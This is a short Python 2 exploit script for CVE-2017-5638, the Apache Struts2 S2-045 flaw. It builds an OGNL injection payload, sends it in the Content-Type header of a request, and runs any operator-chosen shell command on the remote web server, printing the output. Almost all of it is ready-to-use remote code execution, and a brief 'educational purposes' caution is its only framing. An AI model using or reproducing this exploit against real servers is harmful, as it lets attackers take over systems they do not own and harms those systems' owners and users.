#!/usr/bin/python
'''
in this scrip we are exploiting the vulnerabilty
CVE: 2017-5638 - Apache Struts2 S2-045 of Apache struts2
webserver.And getting the shell of remote server.
The port number 80 or on which the webserver is
running should be open.We can do anything by our
computer to remote server through this scrip.
!!!!CAUTION use this script wisely only for educational
purposes
'''

import urllib2          #throuh this we send the request to remote wbserver
import httplib


def exploit(url, cmd):                                                           #this is the payload that is sent with the get request to the webserver
    payload = "%{(#_='multipart/form-data')."
    payload += "(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)."
    payload += "(#_memberAccess?"
    payload += "(#_memberAccess=#dm):"
    payload += "((#container=#context['com.opensymphony.xwork2.ActionContext.container'])."
    payload += "(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class))."
    payload += "(#ognlUtil.getExcludedPackageNames().clear())."
    payload += "(#ognlUtil.getExcludedClasses().clear())."
    payload += "(#context.setMemberAccess(#dm))))."
    payload += "(#cmd='%s')." % cmd
    payload += "(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win')))."
    payload += "(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd}))."
    payload += "(#p=new java.lang.ProcessBuilder(#cmds))."
    payload += "(#p.redirectErrorStream(true)).(#process=#p.start())."
    payload += "(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream()))."
    payload += "(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros))."
    payload += "(#ros.flush())}"

    try:
        headers = {'User-Agent': 'Mozilla/5.0', 'Content-Type': payload}        #header of our request
        request = urllib2.Request(url, headers=headers)                         #giving url of request
        page = urllib2.urlopen(request).read()                                  #page that should be sent as request to the webserver
    except httplib.IncompleteRead, e:
        page = e.partial

    print(page)
    return page


if __name__ == '__main__':
    import sys
    if len(sys.argv) != 3:                                  #3 arguments should be given to the python script
        print("[*] struts2_S2-045.py <url> <cmd>")
    else:
        print('[*] CVE: 2017-5638 - Apache Struts2 S2-045')
        url = sys.argv[1]                                   #argument 2 is given the url of website
        cmd = sys.argv[2]                                   #argument 3 is given the command you want to give remote webserver
        print("[*] cmd: %s\n" % cmd)
        exploit(url, cmd)                                   #calling of a function
